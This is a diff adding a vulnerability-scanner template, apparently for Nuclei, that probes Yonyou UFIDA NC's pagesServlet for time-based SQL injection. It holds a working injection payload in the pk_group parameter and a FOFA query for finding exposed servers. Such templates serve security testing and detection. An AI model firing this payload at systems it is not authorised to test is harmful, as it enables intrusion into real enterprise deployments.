@@ -1,0 +1,27 @@
+id: yonyou-UFIDA-NC-pagesServlet-sqli
+
+info:
+  name: 用友NC pagesServlet SQL注入致RCE
+  author: onewini
+  severity: high
+  description: 用友NC pagesServlet SQL注入致RCE
+  metadata:
+    fofa-query: app="用友-UFIDA-NC"
+  tags: yonyou,sqli
+
+http:
+- raw:
+  - |+
+    @timeout: 30s
+    GET /portal/pt/servlet/pagesServlet/doPost?pageId=login&pk_group=1'waitfor+delay+'0:0:3'-- HTTP/1.1
+    Host: {{Hostname}}
+    Content-Type: application/x-www-form-urlencoded
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
+    Connection: keep-alive
+
+
+  matchers-condition: and
+  matchers:
+        - type: dsl
+          dsl:
+            - 'duration>=3 && duration<5'  
